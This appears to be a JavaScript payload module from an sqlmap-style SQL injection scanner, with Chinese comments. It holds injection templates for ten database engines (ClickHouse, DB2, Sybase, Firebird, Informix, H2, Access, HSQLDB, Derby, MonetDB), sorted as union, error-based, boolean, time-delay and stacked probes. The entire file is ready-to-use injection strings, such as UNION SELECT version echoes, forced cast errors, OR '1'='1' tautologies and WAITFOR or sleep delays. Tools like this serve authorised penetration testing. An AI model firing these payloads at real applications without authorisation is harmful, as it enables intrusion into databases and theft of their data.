// 其余 10 个 DBMS payload 模板（从 payloads.js 拆分）
// ClickHouse / DB2 / Sybase / Firebird / Informix / H2 / Access / HSQLDB / Derby / MonetDB
// 占位符：{ORIG}=原始值 {SLEEP}=延迟秒数 {NUM}=随机整数 {SEP}=注释符

// ClickHouse：列式分析型数据库，自有 SQL 方言（非标准 SLEEP / 用 if() 构造布尔/时间）。
// 仅提供检测 payload（union/error/boolean/time），利用/提取路径标注受限（见 Exploiter/Extractor 映射）。
export const clickhousePayload = {
  union: [
    "{ORIG} UNION ALL SELECT {NUM},version()-- -",
    "{ORIG}' UNION ALL SELECT {NUM},version()-- -",
    '{ORIG}" UNION ALL SELECT {NUM},version()-- -',
  ],
  error: [
    // ClickHouse 报错向量：强制类型转换失败触发 "Cannot parse" / "DB::Exception"
    "{ORIG}' AND cast((SELECT version()),'UInt64')=1-- -",
    "{ORIG}\" AND cast((SELECT version()),'UInt64')=1-- -",
    "{ORIG}' AND 1=CAST((SELECT version()) AS UInt64)-- -",
  ],
  boolean: [
    "{ORIG}' AND '1'='1",
    '{ORIG}" AND "1"="1',
    "{ORIG}' AND '1'='2",
    '{ORIG}" AND "1"="2',
    "{ORIG} AND 1=1",
    "{ORIG} AND 1=2",
    // [6,7] OR-based 布尔变体（对标 sqlmap risk>=2 的 OR 边界，BooleanBlindDetector 在 risk>=2 时投放）
    "{ORIG}' OR '1'='1",
    "{ORIG}' OR '1'='2",
  ],
  time: [
    // ClickHouse 无原生 SLEEP；用 sleep() 函数（单位为秒，命名与 PG 类似但非标准）近似延迟
    "{ORIG}' AND sleep({SLEEP})=0-- -",
    '{ORIG}" AND sleep({SLEEP})=0-- -',
    "{ORIG}'; SELECT sleep({SLEEP})-- -",
  ],
  // ClickHouse 不支持堆叠查询（每次仅单语句），留空不投放
  stacked: [],
};

// —— C 方向新增（最小适配：union/error/boolean 基础；time/stacked 仅 Sybase 支持）——
// 方言 payload 未经真实环境验证，标注待验证。
export const db2Payload = {
  union: [
    "{ORIG} UNION SELECT {NUM},'DB2' FROM SYSIBM.SYSDUMMY1-- -",
    "{ORIG}' UNION SELECT {NUM},'DB2' FROM SYSIBM.SYSDUMMY1-- -",
    "{ORIG}\" UNION SELECT {NUM},'DB2' FROM SYSIBM.SYSDUMMY1-- -",
  ],
  error: [
    "{ORIG}' AND 1=CAST((SELECT 'a' FROM SYSIBM.SYSDUMMY1) AS INTEGER)-- -",
    "{ORIG}\" AND 1=CAST((SELECT 'a' FROM SYSIBM.SYSDUMMY1) AS INTEGER)-- -",
    "{ORIG}' AND db2_sqli_probe_nonexist_func()=1-- -",
  ],
  boolean: [
    "{ORIG}' AND '1'='1",
    '{ORIG}" AND "1"="1',
    "{ORIG}' AND '1'='2",
    '{ORIG}" AND "1"="2',
    "{ORIG} AND 1=1",
    "{ORIG} AND 1=2",
    // [6,7] OR-based 布尔变体（对标 sqlmap risk>=2 的 OR 边界，BooleanBlindDetector 在 risk>=2 时投放）
    "{ORIG}' OR '1'='1",
    "{ORIG}' OR '1'='2",
  ],
  time: [],
  stacked: [],
};

export const sybasePayload = {
  union: [
    "{ORIG} UNION SELECT {NUM},@@version-- -",
    "{ORIG}' UNION SELECT {NUM},@@version-- -",
    '{ORIG}" UNION SELECT {NUM},@@version-- -',
  ],
  error: [
    "{ORIG}' AND 1=CONVERT(int,(SELECT @@version))-- -",
    '{ORIG}" AND 1=CONVERT(int,(SELECT @@version))-- -',
    "{ORIG}' AND 1=CAST((SELECT @@version) AS int)-- -",
  ],
  boolean: [
    "{ORIG}' AND '1'='1",
    '{ORIG}" AND "1"="1',
    "{ORIG}' AND '1'='2",
    '{ORIG}" AND "1"="2',
    "{ORIG} AND 1=1",
    "{ORIG} AND 1=2",
    // [6,7] OR-based 布尔变体（对标 sqlmap risk>=2 的 OR 边界，BooleanBlindDetector 在 risk>=2 时投放）
    "{ORIG}' OR '1'='1",
    "{ORIG}' OR '1'='2",
  ],
  time: [
    "{ORIG}'; WAITFOR DELAY '0:0:{SLEEP}'-- -",
    '{ORIG}"; WAITFOR DELAY "0:0:{SLEEP}"-- -',
    "{ORIG}' WAITFOR DELAY '0:0:{SLEEP}'-- -",
  ],
  stacked: [
    "{ORIG}; WAITFOR DELAY '0:0:{SLEEP}' {SEP}",
    "{ORIG}'; WAITFOR DELAY '0:0:{SLEEP}' {SEP}",
    '{ORIG}"; WAITFOR DELAY "0:0:{SLEEP}" {SEP}',
  ],
};

export const firebirdPayload = {
  union: [
    "{ORIG} UNION SELECT {NUM},rdb$get_context('SYSTEM','ENGINE_VERSION') FROM RDB$DATABASE-- -",
    "{ORIG}' UNION SELECT {NUM},rdb$get_context('SYSTEM','ENGINE_VERSION') FROM RDB$DATABASE-- -",
    "{ORIG}\" UNION SELECT {NUM},rdb$get_context('SYSTEM','ENGINE_VERSION') FROM RDB$DATABASE-- -",
  ],
  error: [
    "{ORIG}' AND 1=CAST((SELECT 'a' FROM RDB$DATABASE) AS INTEGER)-- -",
    "{ORIG}\" AND 1=CAST((SELECT 'a' FROM RDB$DATABASE) AS INTEGER)-- -",
    "{ORIG}' AND firebird_sqli_probe_nonexist_func()=1-- -",
  ],
  boolean: [
    "{ORIG}' AND '1'='1",
    '{ORIG}" AND "1"="1',
    "{ORIG}' AND '1'='2",
    '{ORIG}" AND "1"="2',
    "{ORIG} AND 1=1",
    "{ORIG} AND 1=2",
    // [6,7] OR-based 布尔变体（对标 sqlmap risk>=2 的 OR 边界，BooleanBlindDetector 在 risk>=2 时投放）
    "{ORIG}' OR '1'='1",
    "{ORIG}' OR '1'='2",
  ],
  time: [],
  stacked: [],
};

export const informixPayload = {
  union: [
    "{ORIG} UNION SELECT {NUM},DBINFO('version','full') FROM systables WHERE tabid=1-- -",
    "{ORIG}' UNION SELECT {NUM},DBINFO('version','full') FROM systables WHERE tabid=1-- -",
    "{ORIG}\" UNION SELECT {NUM},DBINFO('version','full') FROM systables WHERE tabid=1-- -",
  ],
  error: [
    "{ORIG}' AND 1=CAST((SELECT 'a' FROM systables WHERE tabid=1) AS INTEGER)-- -",
    "{ORIG}\" AND 1=CAST((SELECT 'a' FROM systables WHERE tabid=1) AS INTEGER)-- -",
    "{ORIG}' AND informix_sqli_probe_nonexist_func()=1-- -",
  ],
  boolean: [
    "{ORIG}' AND '1'='1",
    '{ORIG}" AND "1"="1',
    "{ORIG}' AND '1'='2",
    '{ORIG}" AND "1"="2',
    "{ORIG} AND 1=1",
    "{ORIG} AND 1=2",
    // [6,7] OR-based 布尔变体（对标 sqlmap risk>=2 的 OR 边界，BooleanBlindDetector 在 risk>=2 时投放）
    "{ORIG}' OR '1'='1",
    "{ORIG}' OR '1'='2",
  ],
  time: [],
  stacked: [],
};

export const h2Payload = {
  union: [
    "{ORIG} UNION SELECT {NUM},version()-- -",
    "{ORIG}' UNION SELECT {NUM},version()-- -",
    '{ORIG}" UNION SELECT {NUM},version()-- -',
  ],
  error: [
    "{ORIG}' AND 1=CAST((SELECT 'a') AS INT)-- -",
    "{ORIG}\" AND 1=CAST((SELECT 'a') AS INT)-- -",
    "{ORIG}' AND h2_sqli_probe_nonexist_func()=1-- -",
  ],
  boolean: [
    "{ORIG}' AND '1'='1",
    '{ORIG}" AND "1"="1',
    "{ORIG}' AND '1'='2",
    '{ORIG}" AND "1"="2',
    "{ORIG} AND 1=1",
    "{ORIG} AND 1=2",
    // [6,7] OR-based 布尔变体（对标 sqlmap risk>=2 的 OR 边界，BooleanBlindDetector 在 risk>=2 时投放）
    "{ORIG}' OR '1'='1",
    "{ORIG}' OR '1'='2",
  ],
  // [P1] H2 内建 SLEEP(ms) 函数（单位毫秒，{SLEEP}000 将秒→毫秒），返回 0
  time: [
    "{ORIG}' AND SLEEP({SLEEP}000)=0-- -",
    '{ORIG}" AND SLEEP({SLEEP}000)=0-- -',
    "{ORIG}' AND (CASE WHEN 1=1 THEN SLEEP({SLEEP}000) ELSE 0 END)=0-- -",
  ],
  stacked: [],
};

// —— D 方向新增（最小适配：union/error/boolean 基础；time/stacked 均不支持）——
// 方言 payload 未经真实环境验证，标注待验证。
// Access（Jet SQL）：Using MSysObjects as pseudo-table
// 注意：Access 无原生 version() 函数，用常量串 'ACCESS' 回显标识
// 注意：Access 不支持 error-based 注入，error 留空
// 注意：Access 无原生 SLEEP 函数，time 留空
// 注意：Access 不支持堆叠查询，stacked 留空
// HSQLDB（HyperSQL）：Using (VALUES(0)) t as pseudo-table
// Derby（Apache Derby）：Using SYSIBM.SYSDUMMY1 as pseudo-table
// MonetDB（Column-store）：Using sys.version as pseudo-table
export const accessPayload = {
  union: [
    "{ORIG} UNION SELECT {NUM},1,1 FROM MSysObjects-- -",
    "{ORIG}' UNION SELECT {NUM},1,1 FROM MSysObjects-- -",
    '{ORIG}" UNION SELECT {NUM},1,1 FROM MSysObjects-- -',
  ],
  error: [],
  boolean: [
    "{ORIG}' AND '1'='1",
    '{ORIG}" AND "1"="1',
    "{ORIG}' AND '1'='2",
    '{ORIG}" AND "1"="2',
    "{ORIG} AND 1=1",
    "{ORIG} AND 1=2",
    // [6,7] OR-based 布尔变体（对标 sqlmap risk>=2 的 OR 边界，BooleanBlindDetector 在 risk>=2 时投放）
    "{ORIG}' OR '1'='1",
    "{ORIG}' OR '1'='2",
  ],
  time: [],
  stacked: [],
};

export const hsqldbPayload = {
  union: [
    "{ORIG} UNION SELECT {NUM},'HSQLDB' FROM (VALUES(0)) t-- -",
    "{ORIG}' UNION SELECT {NUM},'HSQLDB' FROM (VALUES(0)) t-- -",
    "{ORIG}\" UNION SELECT {NUM},'HSQLDB' FROM (VALUES(0)) t-- -",
  ],
  error: [
    "{ORIG}' AND 1=CAST((SELECT 'a' FROM (VALUES(0)) t) AS INTEGER)-- -",
    "{ORIG}\" AND 1=CAST((SELECT 'a' FROM (VALUES(0)) t) AS INTEGER)-- -",
    "{ORIG}' AND hsqldb_sqli_probe_nonexist_func()=1-- -",
  ],
  boolean: [
    "{ORIG}' AND '1'='1",
    '{ORIG}" AND "1"="1',
    "{ORIG}' AND '1'='2",
    '{ORIG}" AND "1"="2',
    "{ORIG} AND 1=1",
    "{ORIG} AND 1=2",
    // [6,7] OR-based 布尔变体（对标 sqlmap risk>=2 的 OR 边界，BooleanBlindDetector 在 risk>=2 时投放）
    "{ORIG}' OR '1'='1",
    "{ORIG}' OR '1'='2",
  ],
  time: [],
  stacked: [],
};

export const derbyPayload = {
  union: [
    "{ORIG} UNION SELECT {NUM},'DERBY' FROM SYSIBM.SYSDUMMY1-- -",
    "{ORIG}' UNION SELECT {NUM},'DERBY' FROM SYSIBM.SYSDUMMY1-- -",
    "{ORIG}\" UNION SELECT {NUM},'DERBY' FROM SYSIBM.SYSDUMMY1-- -",
  ],
  error: [],
  boolean: [
    "{ORIG}' AND '1'='1",
    '{ORIG}" AND "1"="1',
    "{ORIG}' AND '1'='2",
    '{ORIG}" AND "1"="2',
    "{ORIG} AND 1=1",
    "{ORIG} AND 1=2",
    // [6,7] OR-based 布尔变体（对标 sqlmap risk>=2 的 OR 边界，BooleanBlindDetector 在 risk>=2 时投放）
    "{ORIG}' OR '1'='1",
    "{ORIG}' OR '1'='2",
  ],
  time: [],
  stacked: [],
};

export const monetdbPayload = {
  union: [
    "{ORIG} UNION SELECT {NUM},(SELECT sys_version FROM sys.version) FROM sys.version-- -",
    "{ORIG}' UNION SELECT {NUM},(SELECT sys_version FROM sys.version) FROM sys.version-- -",
    '{ORIG}" UNION SELECT {NUM},(SELECT sys_version FROM sys.version) FROM sys.version-- -',
  ],
  error: [
    "{ORIG}' AND 1=CAST((SELECT 'a' FROM sys.version) AS INTEGER)-- -",
    "{ORIG}\" AND 1=CAST((SELECT 'a' FROM sys.version) AS INTEGER)-- -",
    "{ORIG}' AND monetdb_sqli_probe_nonexist_func()=1-- -",
  ],
  boolean: [
    "{ORIG}' AND '1'='1",
    '{ORIG}" AND "1"="1',
    "{ORIG}' AND '1'='2",
    '{ORIG}" AND "1"="2',
    "{ORIG} AND 1=1",
    "{ORIG} AND 1=2",
    // [6,7] OR-based 布尔变体（对标 sqlmap risk>=2 的 OR 边界，BooleanBlindDetector 在 risk>=2 时投放）
    "{ORIG}' OR '1'='1",
    "{ORIG}' OR '1'='2",
  ],
  // [P1] MonetDB 内建 sys.sleep(sec) 函数（单位秒），返回 NULL/整数值因版本而异
  time: [
    "{ORIG}' AND (CASE WHEN 1=1 THEN sys.sleep({SLEEP}) ELSE 0 END) IS NOT NULL-- -",
    '{ORIG}" AND (CASE WHEN 1=1 THEN sys.sleep({SLEEP}) ELSE 0 END) IS NOT NULL-- -',
    "{ORIG}'; SELECT sys.sleep({SLEEP})-- -",
  ],
  stacked: [],
};
